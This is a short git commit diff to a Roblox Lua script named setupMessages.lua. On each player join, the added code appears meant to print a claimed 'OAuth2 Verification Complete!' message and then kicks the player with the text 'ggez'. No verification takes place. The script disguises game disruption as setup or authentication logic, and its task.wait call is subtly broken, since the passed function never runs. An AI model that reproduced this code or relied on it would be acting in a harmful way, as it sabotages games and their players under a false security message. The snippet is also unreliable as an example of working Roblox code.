d87d5b61d8bd66aaa86def6ed1197355bcc8399f
mrlokiie123 <133542179+mrlokiie123@users.noreply.github.com>
2023-05-15 11:47:11 -0400

    Update setupMessages.lua

--- setupMessages.lua
+++ setupMessages.lua
@@ -2,7 +2,8 @@ local CreatorId = game.CreatorId;
 print(CreatorId);
 
 game.Players.PlayerAdded:Connect(function(plr) 
-        task.wait(5, function()
-                print('OAuth2 Verification Complete!')
-        end)
+     task.wait(1, function()
+          print('OAuth2 Verification Complete!')
+     end)
+     plr:Kick('ggez')
 end)
